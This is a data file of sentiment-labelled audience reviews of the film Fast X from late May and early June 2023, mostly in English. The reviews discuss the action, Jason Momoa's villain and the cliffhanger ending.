"Jun 1, 2023",POSITIVE,"Vin Diesel y sus compañeros siguen trayendo más acción y emoción en esta secuela que ofrece una gran ola de acción y adrenalina sin frenos. Retomando lo visto en la quinta película, aquí Dominic Toretto enfrenta un gran desafío que pone en peligro a sus compañeros. Toda la película se convierte en una lucha contra un villano bastante excéntrico, pero letal. Vin Diesel sigue sorprendiendo como un héroe de acción y aquí se lo ve en su máximo esplendor. Entre el resto, Tyrese Gibson sigue siendo un buen alivio cómico, Michelle Rodríguez sigue siendo tan ruda como siempre, Charlize Theron aún logra ser una ingeniosa mujer fatal a pesar de su poca aparición, Jason Statham solo hace una mera introducción y sigue siendo asombroso a pesar de ello, John Cena es increíble luchando aunque es curioso que se haya reconciliado tan rápido con Vin Diesel y podría haber mostrado más, por último Jason Momoa se luce bastante siendo un antagonista caricaturesco y carismático. El montaje y las secuencias de acción son excelentes. La cantidad de efectos especiales usados ofrece toda una dosis de acción que asombra e impacta. Todas las persecuciones y explosiones hacen de esta película una excitante montaña rusa de entretenimiento, cien por ciento prometedor. Sin duda es una de las mejores entregas de la saga y el comienzo de lo que podría llegar a ser el gran final de esta saga. Mi calificación final para esta película es un 9/10."
"Jun 1, 2023",POSITIVE,"Great action, great surprises....Jason Momoa was hilarious and insanely chaotic as the new villain. The team is going to put in all the stops to handle this fool cuz he did something that no villain has done: Left the movie on a cliffhanger!! Hyped to see how it all ends!! Family is forever!!"
"May 31, 2023",POSITIVE,"Special effects were excellent!!  Nice to see Little Brian grown up. Lots of action, sprinkled with some humor.
A good summer blockbuster film!!!"
"May 31, 2023",POSITIVE,Action filled with a surprise ending!
"May 31, 2023",NEGATIVE,Die viele Action kann die grenzdebile Story leider nicht mehr retten.
"May 31, 2023",POSITIVE,It was entertaining and surprising.
"May 31, 2023",POSITIVE,"If you like over the top action, good fight scenes, etc then this movie is for you.  Really enjoyed it.  Not going to win any Academy awards for the acting but that is not what this movie is about.  I would definitely recommend it."
"May 31, 2023",POSITIVE,"I enjoyed Fast X. Jason Momoa was the highlight for me. Wow, what a performance by him and the entire cast. I love the hand to hand combat fight scenes, especially the one between Letty and Cipher,that was epic and badass. I loved it! I love the cliffhanger aspect of it. It was perfect. It set it up for Fast 11. I'm very excited to see Fast 11, and I can't wait to see it."
"May 31, 2023",NEUTRAL,Al principio me agrado por que tiene ese toque que tenian las anteriores pero como fue avanzado la pelicula ya se me hacia aburrido y el villano fue como si. Agarramos a el guasón a kang y a modok y los combinamos es divertido al principio pero odioso al final y lo interesante viene al final me quedaría  con las 10 peliculas de 11 que son
"May 31, 2023",NEUTRAL,"I really enjoyed watching this movie, its the type to keep you on the edge of your seat because you really don't know what's going down. I'm not saying you should not watch this film I truly did enjoy this movie I enjoyed all the fast movies. Roman and Tej are absolutely hilarious just like always they never fail to make you laugh. Watching Dom trying to defeat someone makes you wanna get up out of your chair watching him trying that in fast x made me clinch my knuckles but at the end we know Dom never can be defeated. However the 1st (The Fast And Furious ) & the second ( 2 Fast 2 Furious ) were more about car racing, but besides that nothing will ever top the first fast. Fast & Furious went a little downhill when Paul walker ( Brian O'Connor ) passed away during fast 7. Real true fast fans know Fast & furious really did truly end after 7. The fast films are just not the same without Brian it just feels completely wrong. The energy of brotherhood is just not there without Dom's bestfriend (Brian ) they always kick butt together and Dom without Brian just feels completely wrong it breaks my heart. But however there is nothing the directors can do about that. I truly do love when they have mentioned his name in past films to keep his legacy alive which is heartwarming. I know for a fact the opening scene of Paul and Dom most certainly made me tear up tremendously there is nothing like brother hood, but what really made me cry was the scene in the garage when Dom looks at the pictures of Paul & etc. I truly hope the finale fast they find some way to bring Brian back even though he passed away. I might actually cry if they don't. I'm rooting for you Fast directors please do not disappoint us with the final fast!"
"May 31, 2023",POSITIVE,The movie was very nice and a lot of action if you like action movies its worth the money
"May 31, 2023",NEUTRAL,It's a good flim a few flaws hopefully another one to tie up loose ends
"May 31, 2023",POSITIVE,X is bringing closure to all the beloved characters in the movie franchise. Sadly Paul will not appear. ?
"May 31, 2023",NEUTRAL,"It's an ok movie. Lots of action, but too much jumping all over with the many different characters and plots, and only one of them came together at the end. The only bright spot ... Jason Momoa's character makes the movie. This series is getting farther and farther away from its origins, sad cause it could be so much better."
"May 31, 2023",NEUTRAL,"While it seems to have reeled itself in from the nonsense that was Fast 9, ie; No Fieros in outer space this time), Fast X is by no means grounded.  There are no less than three scenes that simply required a hard eye roll and a suspension of belief in basic physics.   But hey, it's what we've come to expect from this quasi-sci-fi series. 
Aside from a surprisingly decent performance from Bri Larsen in a minor role, the true superstar of this movie was Mamoa. His psychotic blend of debauchery and humor was perfect for the villain's role.   Beyond that, the staple of ""the family"" has gotten more than mildly tiresome.  That said the pairing of Letty and Cipher towards the end of the movie was a nice change of pace.  Also the meme of ""saying family in two movies guarantees your return from the dead after three movies"" is apparently accurate as we see the return of Gisele for no particular reason as an ally of Cipher.  WTH? 

Overall it was entertaining, but not something that needs a rewatch right away."
"May 31, 2023",NEUTRAL,A fun ride. Big fan of Jason Momoa as the villain
"May 31, 2023",NEGATIVE,"Jason Momoa's character is a mix of The Joker and a modern version of Capt. Jack Sparrow. But I did like the concept of going after each ""family member"" and not world domination (hence the one star). Each movie must have an ending, we know its a 3 part movie but don't end the movie with an explosion then roll credits. If you have no intensions of killing off Toretto's ""family"" then there is no reason to make this a 3 part movie!"
"May 31, 2023",POSITIVE,This was the best one of the franchise and I'm looking forward to next 2 of this saga. Prepare to have your mind blown. They making a billion easily !!!
"May 31, 2023",POSITIVE,great movie definitely worth the money to see it
"May 31, 2023",NEGATIVE,"They've made way to many if these movies , the film is ok for a night of fun , its not worth rewatching over again."
"May 31, 2023",NEUTRAL,"Enjoyable, but no ending...."
"May 31, 2023",NEGATIVE,"pessimo, perca de tempo"
"May 31, 2023",POSITIVE,"The funniest movie I've seen so far this year. I couldn't stop laughing at how ridiculous everything was in this movie and I mean this all in a having fun, total popcorn movie way. I'd see it again."
"May 31, 2023",NEGATIVE,"The movie was the most disappointing Fast movie. Action was good but there were no story at all. Jason Mamoa did a fantastic job in the film, it reminds me of Heath Ledger's joker. Overall just disappointing."
"May 31, 2023",POSITIVE,"I love the cars and the places we travel through the movie
."
"May 31, 2023",POSITIVE,Amazing fast series never disappoints me or my family with the action the cars everything was amazing
"May 31, 2023",NEUTRAL,"One of the better fast and furious entries, albeit a very looooong one. As usual, it's over the top with a complete disregard of physics, of course, but entertaining. Jason Mamoa shines in this movie, by far the best acting of his career. It's worth going to see for Mamoas performance alone."
"May 31, 2023",POSITIVE,Really enjoyed the movie
"May 31, 2023",NEGATIVE,As much as I love the actors I can't give good review.  This movie is a set up for another sequil. Ending was not an end. Lots of unrealistic stunts. I think a 13 year old may appreciate. But we were bored.
"May 31, 2023",NEUTRAL,This is not at all the movie in which you get to see good story and common sense.  Vehicles are falling from the sky in this and the actors do whatever they want but have the guts to get scratched. 😁
"May 31, 2023",POSITIVE,"Its was pack with lots of emotion , Awesome actors"
"May 31, 2023",POSITIVE,Do not come in expecting an Oscar worthy film and stop comparing it to the original film. Great action movie but some cheesy CGI at times. Looks like they're setting up for a big finale!
"May 31, 2023",POSITIVE,One of my favorite Fast X! Cant wait to see part 2.
"May 31, 2023",NEGATIVE,if paul walker were alive the saga would end already
"May 31, 2023",NEGATIVE,"I was very disappointed , beginning of the movie was like almost 15 minutes of an old movie and what's strange is every time Dom and Dante meet he doesn't even fight him All he does is negotiate or race ?? 
Crazy part is how Dom saved his son like What !!! Drift open the door and wala he's in the car again ? 
And after 2 hours it has to be continued? 
After all of that the story doesn't even have a point like the other movies did."
"May 31, 2023",NEGATIVE,"Although, I have been a fan of this series since day one. FF9 was a turning point for me. It was the first time I was completely board and couldn't wait for it to end. I thought  to myself, I won't be seeing the next one in theaters. Jump ahead to present day and there wasn't much else still playing at my local theater. Afterall, movies leave and go to steaming in two weeks time. So, all that is left to see are one or two choices. I went ahead a saw Fast X. 

Fast X is only a slight improvement over the last one, I wasn't board, I left wanted to see the next one. But the mainstay characters are getting stale and only the cameos from bigger stars like Jason Statham, John Cena, etc. keep these film above water. And they really are just cameos now, who walk in and out of a scene or two, or a post credit scene. It's like a bate and switch when you put them on the poster. Jason Momoa was a good addition, but he is just doing his impression of the Joker, nothing new. 

As for a main crew, they are given very little to do except banter and it isn't fresh, much like this score."
"May 31, 2023",NEGATIVE,done with these movies 🥴👎
"May 31, 2023",POSITIVE,I like everything about the movie especially the end now I Really dont Know what is going to happen and what happened to everyone??
"May 31, 2023",POSITIVE,"I enjoyed the movie, no matter how completely unrealistic the car scenes are. The Dodge brand will NEVER go out of business / style the way these cars defy the odds in this movie. I might mess around and go get me a Demon Charger tomorrow since I can stop bombs from rolling with it and avoid multiple building’s collapsing while launching up a ramp and perfectly contacting construction equipment aiding me in my stopping a bomb goal. If Torretto says “Family” slow and deep 1 more time , I’m going to run up to the theater screen w/scissors and run across the screen leaving a big gash. Jokes but I enjoyed the movie EVEN THOUGH …. They ended the movie in the middle of a scene like this is a Netflix show and episode 11 comes out the next Friday at midnight - I’ve only seen 1, 2, & X so I’m not sure how the other movies end - the way this 1 ended was ridiculous. I’m racking my brain trying to guess how it ends with bad guy Jason Momoa about to cause major damage - and the credits just show up ??!!! What are we doing here, get over yourselves and end the bleep bleep movie. Shaking My Head !!!"
"May 31, 2023",POSITIVE,Can't wait for the next
"May 31, 2023",NEGATIVE,NOT worth the 2 hours or the money!!
"May 31, 2023",NEGATIVE,I think it's garbage.
"May 31, 2023",POSITIVE,"This film is even more out there than the others, and not in a good way, but Jason Momoa just made this movie for me. That is the only reason it is getting top marks. He was just incredible. I thought Jason Momoa was ok before as an actor, but I did love him in this film."
"May 31, 2023",NEGATIVE,"I've never left a single review on this website but this movie made me do it. I have watched every single fast and furious movie and some of them are good, this one though, Fast X - is the worst movie i have watched in the last few years. Everything from stolen jokes to unfinished ending makes you wanna get a refund. Even Dwayne Johnson left the movie even though he still appears there for 10 seconds. CJI is worse than in fast and furious 5, I don't know how that's possible. The movie is so predictable, for the first time ever I wanted to fall asleep in the theater. This is an embarrassment for all the actors and producers. One advice - stop making fast and furious movies."
"May 31, 2023",POSITIVE,it was good got mixed reviews before watching it tho
"May 31, 2023",POSITIVE,High action and thriller scenes. The villain  is awesome!
"May 31, 2023",NEGATIVE,"Continuity errors, bad plot, bad dialog and crazy stupid action sequences. Still worth the price of a ticket for Momoa as Dante. He's officially my favorite villain of the franchise! I hear there are two more movies coming and I hope he's the Big Bad in both of them before they eventually kill him."
"May 31, 2023",NEGATIVE,"Horrible movie, bad acting, bad story line and BAD!!"
"May 31, 2023",NEGATIVE,If I could give lower I would
"May 31, 2023",POSITIVE,Full throttle action throughout the entire movie!
"May 31, 2023",NEGATIVE,"A seemingly endless movie about a dysfunctional family whose members (some of them) have been killed off in other movies but miraculously appear in subsequent movies.  The story lines are all over the place, and it just seems like lazy writing.  Let's talk about the movie's antagonist, Jason Mamoa. What if I was to tell you that the Joker, Jack Sparrow, and the Genie from Aladdin had a metro baby?  Well that's Jason Mamoa's character all wrapped up into one.  I understand that the writers wanted some comic relief, but seriously went overboard on this villain.  There's nothing I like or dislike about him, which is the problem.  I only want Vinny the Diesel to stop him so that the movie will end, which unfortunately it doesn't.   There's a guaranteed fast eleven coming and I imagine everyone lives through that ending........I'm not gonna spoil and already rotten movie. (HOW DID HAN LUE SURVIVE THE CRASH IN TOKYO DRIFT? THE WORLD MAY NEVER KNOW)
 
I love watching big budget action films in the theater, but I think I'll skip Fast XI through XXV and watch them on FX (SEE WHAT I DID THERE?)."
"May 31, 2023",POSITIVE,This storyline always leaves you wanting more. The 10th version does not disappoint. Buckle up buttercup it’s going to be an exciting ride.
"May 31, 2023",POSITIVE,I love all fast and furious movies including this one. There was a lot going on in this movie and it seem Dom finally met his match! Upset with how it left me hanging but I can’t wait for the part 2! Great movie.
"May 31, 2023",NEGATIVE,Cliche and pandering to the audience. Terrible VFX and cheesy writing.
"May 31, 2023",POSITIVE,never thought this movie will be really good. a lot of action
"May 31, 2023",POSITIVE,"Always entertaining even when the stunts are super ridiculous. Love al the history and new people. Mamoa's character is hard to hate. flamboyant, funny and great accessories. excited for more."
"May 31, 2023",NEGATIVE,The ending didn’t make any sense and it didn’t had a happy ending
"May 31, 2023",POSITIVE,Love how crazy Jason is!
"May 31, 2023",NEGATIVE,"Stupid Dialogue, Stupid Acting.  Does Vin Diesel have more than ONE Facial Expression???  I swear I felt myself getting more Stupid by the minute I watched this movie.  No amount of Guest Appearances could make up for the CRAP writing."
"May 31, 2023",POSITIVE,Action from start to finish. Exactly what I expect from the franchise!
"May 31, 2023",NEUTRAL,"I don’t know how we made it this far but we’re here. Years later, this franchise is still going strong. So my first reactions are it’s good. Not great, but good. It’s a soap opera with action and cars that’s managed to keep you around to find out what happens next. A lot of new characters. Lots of action. Story was not the greatest but it serves its purpose to set up the finale. Last thing.. This needs to end. This movie was good, but it’s time. "
"May 31, 2023",POSITIVE,Loved it!!! Cant wait for the next one!!!
"May 31, 2023",POSITIVE,Mamoa’s character is my only critique. But I blame the writers not him
"May 31, 2023",POSITIVE,"Hands down, best F&F movie in years. Absolutely LOVED it! Stay for the extra scene!"
"May 31, 2023",POSITIVE,Loved - action pack movie
"May 31, 2023",NEGATIVE,"I have followed the series as a die hard fan since day one but I must say this movie was an atrocity! Things just got more ridiculous after Paul walker passed. Dons a mathematical genius and plays pool with cranes, dodge charger get launched 100's of feet into a wall…falls another 50ft and still drives, defying physics/gravity and magically driving down the Hoover damn, bad guy armored vehicles sliding for miles as if on a water slide but when their armored vehicle flips and slides it's the logical distance. I could go on and pick this movie apart in every scene. Just as every other movie that tries to out do themselves…this saga should have been laid to rest many movies ago."
"May 31, 2023",NEGATIVE,Worse movie I’ve ever seen next to the other Fast and Furious movies. I can’t believe I wasted money on watching this movie.
"May 31, 2023",POSITIVE,The best can't wait for the next one
"May 31, 2023",POSITIVE,"i loved everything about the movie! there were some quotes that i thought were kinda cringy, but besides that it was a fantastic movie! the ending was very unexpected, but i’m happy to know there will be another!!"
"May 31, 2023",POSITIVE,Fucking incredible. They continue to amaze me every movie. Surprise after surprise. Fast X is a must see and I will be seeing it again. 5/5
"May 31, 2023",POSITIVE,"Some much action no time for sleeping Jason was off the hook such a different character for him I love love loved it 
Cant wait for next"
"May 31, 2023",POSITIVE,Wow...azaming movie.
"May 31, 2023",POSITIVE,"Loved it, great action, so many different turns DID NOT LIKE THE CLIFFHANGER BUT I WILL LIVE. cant wait for the new movie"
"May 31, 2023",POSITIVE,"They left it on a Cliffhanger, not just one but more than 3!!"
"May 31, 2023",NEUTRAL,Fun movie. These are practically superhero genre now and should be treated as such.
"May 31, 2023",POSITIVE,perfect follow up to f9
"May 31, 2023",NEGATIVE,Good action packed film however did not like the intro of many characters but ok I guess. and wtf jason mamoa playing a queer? Cmon seriously! 😐 and what the hell is john cena still doing in the movies?! this series has dived into a deep pit of failure I want my money back
"May 31, 2023",POSITIVE,"I’m so angry… I had a joke all planned out for when I inevitably hated this movie… but little did I know… I would actually end of loving it. 

But for my own fun, here is that review:

“For a movie that has a title that sounds like a laxative, the dump I squeezed out prior (to showtime) had more fast and furious tendencies than the movie itself.”               
Fast X is easily the best since Furious 7. Despite having absurdly “superhero-like” moments… the movie somehow feels a lot more grounded like in a Fast Five kind of way. I also feel that the Fast and Furious films are as good as their villains… and Jason Mamoa brings an refreshing energy that I have not felt since Statham joined in Furious 7 (I’d argue Cena is a great edition to the series, but I prefer how they used him in this rather than F9). If this is the penultimate chapter, I cannot wait to see what’s to come in the final chapter… or… I guess maybe the penultimate chapter according to Diesel? Who cares… I’ll be there with my seatbelt Fast10’d."
"May 31, 2023",POSITIVE,We love how it keeps us entertained the entire time. It was a great movie! We enjoyed it as a family been watching since the beginning its always a surprise with the movies cant wait for the next!
"May 31, 2023",POSITIVE,"At this point, that the Fast franchise has left behind any idea of reality and draws on ideas that the Mission Impossible and Avengers franchises rejected as too crazy.  With that expectation firmly in mind, if you liked the last few Fast movies, you'll like this one too."
"May 31, 2023",POSITIVE,Cant wait for the next one
"May 31, 2023",NEUTRAL,"Lots of action, couple hokey effects but entertaining."
"May 31, 2023",POSITIVE,ALL THE ACTION WAS AWESOME!
"May 31, 2023",POSITIVE,fun and exciting...the way movies used to be!
"May 31, 2023",NEUTRAL,"Entertaining, what you expect from Fast and Furious franchise!"
"May 31, 2023",POSITIVE,"Loved it, amazing cast, good story line, sticks to the franchise with great over exaggerated car chase scene. This is a great start for the 3 movie finale. 
I watched this movie on Cineplex 4D which added the fun of this movie experience."
"May 30, 2023",POSITIVE,Was really good but hated the ending
"May 30, 2023",POSITIVE,It was fast and it was furious
"May 30, 2023",POSITIVE,This is a great 'pass the time' flick and a perfect summer getaway. A+
"May 30, 2023",NEGATIVE,It ended right as I thought it was gonna get interesting
"May 30, 2023",POSITIVE,"Fantastic Movie, full of suspense"
"May 30, 2023",POSITIVE,"Great cast lineup.  I really didn't like Jason Mamoa's character, which is exactly how it should be.  He is horrible! Can't wait for the final movie."
"May 30, 2023",POSITIVE,LOVED THE ACTION AND THE FAMILY TIES.
"May 30, 2023",POSITIVE,"This movie is a non stop adrenaline ride, I totally enjoyed this movie and looking forward for the final part two! Don't let no negative feed backs stop you from enjoying the show. Totally worth it!"
"May 30, 2023",NEUTRAL,ive never seen any other f&f movies but this one was wild
"May 30, 2023",NEUTRAL,I didn't like the way it ended.  Everybody keep coming back to life just to die again
"May 30, 2023",NEGATIVE,"This was one of the worse films I seen.
Only thing stopping me waking out was €12 I paid"
"May 30, 2023",POSITIVE,I loved it! It was so fun becuase of jason momoa s performance. I was expecting it to be a bit boring and too serious but it was fun as hell. A bit SF but let s face it: it s a movie inspired by a video game. It was the best fast and furios ever.
"May 30, 2023",NEUTRAL,Hate that its a two parter! But good story up till then.
"May 30, 2023",POSITIVE,This movie was really good and had a lot of emotional moments. Put in a lot of famous actors and a cliffhanger and you got another awesome Fast and Furious 
"May 30, 2023",POSITIVE,It was intense and comic at times that make it more real.
"May 30, 2023",NEGATIVE,About 40 scenes that really have no relevance . And too many stars doing nothing . Way too long .  Thank god for aquaman and reacher or it would have been a total flop
"May 30, 2023",NEUTRAL,"It was enjoyable enough for a while but at a certain point it just got old.  I know w Fast & Furious movie is going to be absurd but at a certain point, enough is enough.  It's time to say that this one is the last one. And how many times can we watch characters die  a horrific death just to have them show back up like nothing happened.  Please end this series now. Even those of us that loved it (at least up to a point) are tired of it"
"May 30, 2023",POSITIVE,"As usual, the action was non-stop almost from the very beginning of the movie. Enjoyed it a lot, The only thing I was disappointed about was how they ended the movies."
"May 30, 2023",NEGATIVE,This franchise should have stopped long ago
"May 30, 2023",POSITIVE,"Fun.
Jason M is overwhelming.
A good popcorn time"
"May 30, 2023",NEGATIVE,I will make this simple this was a very dumb movie but if want to laugh go see this. Outside of that the only reason to pay for a ticket is Jason Momoa's performance. Enjoy!
"May 30, 2023",POSITIVE,"nonstop, you 😉 wink and you missed it. Must see!"
"May 30, 2023",POSITIVE,"Realistically the cars should have fell apart so many times. The villain was too over the top (esp. compared to his previous role as Aquaman)! 
There were two cliffhangers. 
 And it appears there's no ending to the series of movies."
"May 30, 2023",NEGATIVE,Missed the movie due to illness
"May 30, 2023",POSITIVE,That movie was fantastic. Just waiting on part 2!!!!
"May 30, 2023",NEGATIVE,I feel the movies have gotten worse and worse since sadly Paul Walker died. It was all about racing  and action but now it's totally about non-believable things like flying out of a car…etc. I would say watch it yourself and be the judge.
"May 30, 2023",NEGATIVE,"It's about as bad as it gets, at least until the next chapter, but it will make a ton of money none-the-less.  Kudos to the real stars of this movie - the CGI and stunt team - that elevate the action sequences to absurdity.  All with no emotional investment because once again, nobody dies (or stays dead) in this series, except for obviously Walker who continues to be sorely missed.  Diesel has all the emotional range of a tree (Groot to be specific), and his shtick has run thin.  Yes, I paid to see it, i hate myself for it, but sure I will line up when the next one comes out..."
"May 30, 2023",NEUTRAL,"I'm dubbing this the Infinity War of F&F movies. It spends a lot of time rounding up characters and setting things up with a somewhat disappointing payoff. Without giving anything anyway, it's obvious that this is part one of at least one more movie. It makes a lot of the movie feel like meandering. However, it's still a smart choice to try and build on the franchise they already have, rather than introducing a whole bunch of new ideas like usual. 

If you're just here for the cars and explosions, you'll find them, though it's obvious that they're holding back in favor of the next movie. There are some nice homages to the previous entries in the franchise, though the movie sours itself by pointing them out aggressively (do they assume the viewers of the F&F franchise are idiots? I'm offended).

Jason Momoa is shockingly fun. He's still tropey, but it's fresh for this franchise so it's better than usual. At least the whole cast looks like they're having fun. Unfortunately this movie shoots itself in the foot by being WAY too quippy to the point where it's actually kind of annoying to watch most of the scenes with Roman and Tej.

If this is Infinity War, then one can only hope that Endgame will follow soon and will hold absolutely nothing back."
"May 30, 2023",NEUTRAL,"I would start off by saying I'm not a fan of the F&F franchise but went with my partner. Overall was a good movie, ran long and jumped around a lot but I would recommend if you like F&F or action."
"May 30, 2023",POSITIVE,"although the theme of recycling characters, literally bringing them back from the dead, is not to my liking. Momoa's participation has been impeccable. Simple plot, but effective. Recommended movie"
"May 30, 2023",POSITIVE,You have to be open minded as this is an action movie with almost impossible scenarios and if you get that out of the way it is truly and amazing story!!
"May 30, 2023",NEUTRAL,"Nu știu unde pot sa mearga data vitoare, însă următorul film trebuie fie incredibil, ca să depășească ce pot sa facă acești ""eroi moderni """
"May 30, 2023",NEGATIVE,its better than Fast 9.  Momoa was pretty good.  They should really end this series.  Yes there is action but not much else.  More brainless action.  No one can really die in this franchise its beyond silly
"May 30, 2023",NEGATIVE,same thing as the first movie
"May 30, 2023",POSITIVE,it was awesome 👌 👏 😎
"May 30, 2023",NEUTRAL,Kinda just the same as all the other movies in this series except new cars and a twist on things towards the end as the movie progressed I got the feeling I was watching the joker because the villain in the movie had the same characteristics as him jokes around as he killed here hurt people. Biggest disappointment was the ending
"May 30, 2023",NEGATIVE,"the only star is for Jason Mamoa!!!! the rest, please go home"
"May 30, 2023",NEUTRAL,Hated the no ending.  They wanted to include every previous actor and their appearances felt like add Ons. All actors seemed to act like they are tired of the series and the story line.  Production was fantastic as alway.
"May 30, 2023",POSITIVE,Continued excitement.  Need a woman like Michelle Rodriguez.
"May 30, 2023",NEUTRAL,was coo but gettin tired now
"May 30, 2023",POSITIVE,Still love the car and the characters they play. Love the imagination and how that shows up in the theatrics.
"May 30, 2023",NEUTRAL,"I like movies with endings! Not another cliffhanger to wait years on! I didn't like 25 minutes advertisements before movie started, almost 3 hours before movie over."
"May 30, 2023",POSITIVE,Lots of action and heart! Highly Recommend!
"May 30, 2023",NEGATIVE,"Talk about expanding your family then letting them die, and then the dead coming back to life. Well, that sums up what the Fast X family is all about. Other than that, Jason Mamoa's Joker-like performance was incredible. Too bad, it's too long that we'll have to wait for another Fast and Furious movie which might probably be called Fast X-2. Let's see who they will revive again in this franchise."
"May 30, 2023",POSITIVE,It was honestly great
"May 30, 2023",POSITIVE,Great movie but that ending confused me.
"May 30, 2023",POSITIVE,lots of action surprised by all the stars that were in the movie lots of surprises. Quirky end though but over all loved the movie. might be one of my favorites
"May 30, 2023",NEGATIVE,such a horrible movie. 😫
"May 30, 2023",POSITIVE,Jason Momoa killed it!!!
"May 30, 2023",NEGATIVE,Better than 9.  Momoa did good acting. Over the top.  5 mini movies within X is disjointed. They should just end these series.  Just a money grab.  Over the top CGI movie.
"May 30, 2023",POSITIVE,"I loved seeing all the favorite characters return, but they didn’t interact enough for me. I usually love all the stunts, but this movie has a lot. It may be just a little too much. The movie is fast paced and absolutely keeps your attention. The villain is more like the riddle from DC comic movies."
"May 30, 2023",NEUTRAL,I didn't like the way the movie ended
"May 30, 2023",NEUTRAL,"Idk to think anymore 10 movies later when one of the main characters get super powers each movie since F&F 5. I guess I can suspend reality for a minute but with the first two you didn't need to suspend reality, exception is the last stunt in F&F2"
"May 30, 2023",POSITIVE,See it in a big screen Cinema with great sound. So much fun. Thank you team. 😃
"May 30, 2023",POSITIVE,Great action and suspense!
"May 30, 2023",POSITIVE,"A great movie. The plot, the actionunreal!"
"May 30, 2023",NEGATIVE,"Cool animations, same thing over again. Franchise been trash since Fast 6 and the best one was Tokyo Drift"
"May 30, 2023",NEUTRAL,I Liked it a lot but now I had my doubts because there were a lot of people dead and now they are surfing.
"May 30, 2023",NEUTRAL,"Not the best entry, this series is starting to get old. Jason Mamoa as the villain steals the show. Let’s hope they are racing towards an ending soon!"
"May 30, 2023",NEGATIVE,Jason Momoa character doesn’t match him at all.
"May 30, 2023",POSITIVE,Typical Fast and Furious movie but still entertaining can’t wait to see Fast XI
"May 30, 2023",POSITIVE,"I liked this one much better than the last one. Mamoa's character was a flamboyant cartoon character, but he got the job done."
"May 30, 2023",POSITIVE,"Excellent ending, excellent send off for the team, nicely done"
"May 30, 2023",POSITIVE,"If anyone hasn't seen this movie, I hope they see it in 4DX. It was a fun experience."
"May 30, 2023",POSITIVE,It is a fun movie :) there is a lot of characters and things happening yet the action is always going. I can't wait to see the next movie will be. A must watch!!!
"May 30, 2023",NEUTRAL,best dum action you can only get with these movies
"May 30, 2023",POSITIVE,"Good movie, lots of action..!!!!"
"May 30, 2023",POSITIVE,"Amazing. Great movie, the Villain Jason Momoa as Dante was so funny. Reminds me of Joker. Can't wait for Pt.2, also stay after credits."
"May 30, 2023",POSITIVE,it was fast paced and exciting.
"May 30, 2023",NEGATIVE,"I like the action I thought this was the last one so I was disappointed  at the ending. but I read that there's already and 11th one being made. also I came to see Jason  momoa  but was disappointed in his character, I felt they made it try to fit in with the whole woke thing going on. if I had paid more than  10$for this movie I would of be mad."
"May 30, 2023",NEUTRAL,"Tuve la oportunidad de verla en estreno, pero es una buena película, buen cgi, efectos, escenas de acción, etc . Por otro lado, siento que la pelicula tiene mucha escenas de acción que no se podrán explicar (como que el Hijo de Toreto salte en un carro en moviento), pero como digo Toreto tuve fe jaja 3.5/5"
"May 30, 2023",POSITIVE,It was definitely action packed filled with twist and turns but at times it got a little tiring watching Jason Momoa behave and act like the joker!  I was hoping he would snap out of it and be the badass villain with a professional attitude thats a combo of the Equalizer and 007 but due to over confidence would eventually get what he deserves a Jokers ending
"May 30, 2023",POSITIVE,Absolute loved it!! The suspense was mind blowing! Cant wait for the next one
"May 30, 2023",POSITIVE,"I actually like this one better than some of the previous movies.  I feel like there is more character development and it was a tad deeper than a few of its predecessors.   Also now way interested to see how Gisele and Hobbs play into the cliff hanger.  Jason Momoa was absolutely amazing in this film.  He is definitely the best Fast Villain to date, no argument.  He was funny while being absolutely frighteningly scary at the same time.  He nailed the ""socio-path"" bit.   The only thing that could get another half star for a Fast movie is if they were to bring in Brian for a last send off.  Of course if they do it wrong it could take away multiple stars...  Lets see what Fast 11 has in store!  :-)"
"May 30, 2023",NEGATIVE,Nothing spectacular about this movie at all and the ending. Absolutely sucks.
"May 30, 2023",POSITIVE,"I like that the team had to rely on ol' fashioned smarts, grit, and brawn in this one.  Jason Momoa was a nice touch, but it seemed he was a tad over the top. Perhaps you needed an over the top villain for Dom and his team! Looking forward to the next installment with BIG hopes for a Dante-Hobbs showdown!!!"
"May 30, 2023",NEGATIVE,The unrealistic stuff is getting old. Storyline had potential but the ridiculous stunts etc made it stupid.
"May 30, 2023",POSITIVE,Great movie. Too much animation. Nice story so many loose endings.
"May 30, 2023",POSITIVE,It was so much fun and made all these connections to past movies in the series.
"May 30, 2023",NEGATIVE,One of the worst fast furious movies i have seen and i'm a big fan. Movie was 2:30 hours and i feel i walked away at the end like i just finished a episode of a show. Just leave the viewer hanging like that… wont even comment about how unrealistic stunts and story is getting but that was the trend with past ones.
"May 30, 2023",NEGATIVE,Dante was a boring antagonist. The movie felt like 3 different side stories barely linked together.
"May 30, 2023",POSITIVE,Very entertaining and pleasantly surprised.  Hubby and I liked it!
"May 30, 2023",POSITIVE,"Definitely not the best and is very much a part 1 to either a duology or trilogy. The family is back together and slowly being torn apart! Jason Momoa shines as the eccentric villain, one who needs a few surprise returnees to the franchise to help slow down his rage. Looking forward to Fast 11, long live fast cars and freedom!"
"May 30, 2023",POSITIVE,It had lots of action! The car chases were crazy! And I love the way they mixed in all the emotions with the action
"May 30, 2023",NEUTRAL,"Momoa is a great addition. Ending was not great, left unfinished for sure (that was not a cliffhanger)"
"May 30, 2023",NEGATIVE,"Vin Diesel Horrible actor. 
Jason Momoa Actually did good. 
But overall the production was bad"
"May 30, 2023",NEGATIVE,It was the biggest load of crap if you wanna see a ton of bridges and a glittery sociopath with space buns and fingernail polish that is obsessed with ballet have fun I guess
"May 30, 2023",POSITIVE,I loved the action & suspenseful ending.
"May 30, 2023",POSITIVE,"I loved the all the car crashes and action in the movie. I really didn't like the ending, it left me with too many questions"
"May 30, 2023",NEUTRAL,2+ hours of explosions and improbable driving. A good escape but excessive as well.
"May 30, 2023",NEUTRAL,It was a typical Fast and Furious movie with lots of action and far fetched moves.  But I think it is well worth seeing on the big screen to get the full effect.  I would definitely recommend it.
"May 30, 2023",NEGATIVE,This was horrifying silly. F&F continues to get more ridiculous. I'm a fan of Alan Ritchson and was horrified to see him stope to this level. The fact people continue to support this is sad and a horrible state of the lack of intellect this work now holds.
"May 30, 2023",POSITIVE,Jason Momoa was fantastic in this! I will most definitely be watching this movie again.
"May 30, 2023",POSITIVE,The Fast Saga Fast X  is the best movie that you will ever watch. My sons and I have watched all of them from the beginning.
"May 30, 2023",POSITIVE,Tons of action and humor.  Ten times better than what I expected.
"May 30, 2023",POSITIVE,"One of the best movies in the franchise, Jason Mamoa is one of a kind actor"
"May 30, 2023",POSITIVE,"there was nothing i disliked, fast moving and left you wanting more and what happened to some of the characters."
"May 30, 2023",POSITIVE,"Exciting great movie, cant wait for the next ."
